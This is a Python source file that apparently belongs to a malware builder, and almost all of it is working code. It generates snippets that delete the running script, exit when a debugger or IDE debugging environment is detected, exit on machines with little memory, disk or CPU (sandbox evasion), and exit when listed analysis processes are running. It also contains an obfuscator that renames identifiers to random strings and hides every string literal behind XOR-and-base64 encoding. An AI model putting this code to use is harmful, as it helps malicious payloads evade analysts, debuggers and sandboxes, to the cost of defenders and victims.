import ast
import base64
import io
import os
import random
import re
import secrets
import string
import tokenize


def python_seppuku():
    return '''
def s():
    os.remove(__file__)
'''


def python_anti_debug_checks():
    return '''
def c_debug():
    if sys.gettrace() is not None or os.environ.get('USING_PDB') or os.environ.get('PYDEV_CONSOLE_ENCODING') or os.environ.get('PYDEVD_LOAD_VALUES_ASYNC'):
        sys.exit()
c_debug()
'''


def python_specs_checks(os_name: str):
    d = '''
def c_exec(i):
    return subprocess.check_output(i, stdin=subprocess.PIPE, shell=True).decode('utf-8').split('\\n')
    
def c_specs():
    rx = r"\d+[.,]?\d*"'''
    if 'win' in os_name.lower():
        d += '''
    t_mem = int(float(re.findall(rx, c_exec('systeminfo | findstr /C:"Total Physical Memory"')[0])[0]) * 1024)
    t_dsk = int(re.findall(rx, c_exec('wmic logicaldisk get size')[1])[0]) // 1024 // 1024'''
    else:
        d += '''
    t_mem = int(re.findall(rx, c_exec('grep MemTotal /proc/meminfo')[0])) / 1024
    t_dsk = re.findall(rx, c_exec('df -h / | awk \'{print $2}\' | tail -n 1')[0])'''
    d += '''
    t_cpu = os.cpu_count()
    if t_mem < 4000 or t_dsk < 50000 or t_cpu <= 2:
        sys.exit()
c_specs()
'''
    return d


def python_proc_checks(os_name: str, proc_list: []):
    d = f'''
def c_proc():
    ss = {str(proc_list)}'''
    if 'win' in os_name.lower():
        d += '''
    ps = subprocess.check_output('tasklist', stdin=subprocess.PIPE, shell=True).decode('utf-8').split('\\n')'''
    else:
        d += '''
    ps = subprocess.check_output(['ps', 'aux'], stdin=subprocess.PIPE, shell=True).decode('utf-8').split('\\n')'''
    d += '''
    for pr in ps:
        for sr in ss:
            if re.search(sr, pr, re.IGNORECASE):
                sys.exit()
c_proc()
'''
    return d


def remove_docs(source):
    io_obj = io.StringIO(source)
    out = ""
    prev_toktype = tokenize.INDENT
    last_lineno = -1
    last_col = 0
    for tok in tokenize.generate_tokens(io_obj.readline):
        token_type = tok[0]
        token_string = tok[1]
        start_line, start_col = tok[2]
        end_line, end_col = tok[3]
        if start_line > last_lineno:
            last_col = 0
        if start_col > last_col:
            out += (" " * (start_col - last_col))
        if (
                token_type != tokenize.COMMENT
                and token_type == tokenize.STRING
                and prev_toktype != tokenize.INDENT
                and prev_toktype != tokenize.NEWLINE
                and start_col > 0
                or token_type not in [tokenize.COMMENT, tokenize.STRING]
        ):
            out += token_string
        prev_toktype = token_type
        last_col = end_col
        last_lineno = end_line
    return '\n'.join(l for l in out.splitlines() if l.strip())


def do_rename(pairs, code):
    for key in pairs:
        code = re.sub(fr"(?<!\.)\b({key})\b", pairs[key], code, re.DOTALL)
    return code


def get_name():
    return ''.join(random.choice([*string.ascii_letters]) for _ in range(random.randint(2, 4)))


def hide(d: bytes, k: bytes) -> bytes:
    return bytes(c ^ k[i % len(k)] for i, c in enumerate(d))


def py_obfuscate(cc):
    code = remove_docs(cc)
    parsed = ast.parse(code)

    funcs = {
        node for node in ast.walk(parsed) if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
    }
    classes = {
        node for node in ast.walk(parsed) if isinstance(node, ast.ClassDef)
    }
    args = {
        node.id for node in ast.walk(parsed) if isinstance(node, ast.Name) and not isinstance(node.ctx, ast.Load)
    }

    for func in funcs:
        if func.args.args:
            for arg in func.args.args:
                args.add(arg.arg)
        if func.args.kwonlyargs:
            for arg in func.args.kwonlyargs:
                args.add(arg.arg)
        if func.args.vararg:
            args.add(func.args.vararg.arg)
        if func.args.kwarg:
            args.add(func.args.kwarg.arg)

    pairs = {}
    used = set()

    def set_name(k):
        newname = get_name()
        while newname in used:
            newname = get_name()
        used.add(newname)
        pairs[k] = newname

    for func in funcs:
        if func.name.startswith("__"):
            continue
        set_name(func.name)
    for _class in classes:
        set_name(_class.name)
    for arg in args:
        set_name(arg)

    string_regex = r"(['\"])(.*?)\1"
    original_strings = re.finditer(string_regex, code, re.MULTILINE)
    originals = [
        match.group().replace("\\", "\\\\")
        for matchNum, match in enumerate(original_strings, start=1)
    ]
    placeholder = os.urandom(16).hex()
    code = re.sub(string_regex, f"'{placeholder}'", code, 0, re.MULTILINE)
    code = do_rename(pairs, code)
    code = re.sub(r"^(import .*)", r"\1" + ', base64', code, flags=re.MULTILINE)
    replace_placeholder = r"('|\")" + placeholder + r"('|\")"
    for original in originals:
        original = original.replace("'", "").replace('"', '')
        if original and not original.startswith("\\") and not original.lower().startswith("utf-8"):
            key = base64.b64encode(secrets.token_bytes(8)).decode("utf-8")
            encoded = base64.b64encode(hide(original.encode('utf-8'), base64.b64decode(key))).decode('utf-8')
            original = f'bytes(a ^ base64.b64decode("{key}")[b % 8] for b, a in enumerate(base64.b64decode("{encoded}"))).decode("utf-8")'
            code = re.sub(replace_placeholder, original, code, 1, re.MULTILINE)
        else:
            code = re.sub(replace_placeholder, f"'{original}'", code, 1, re.MULTILINE)
    return code
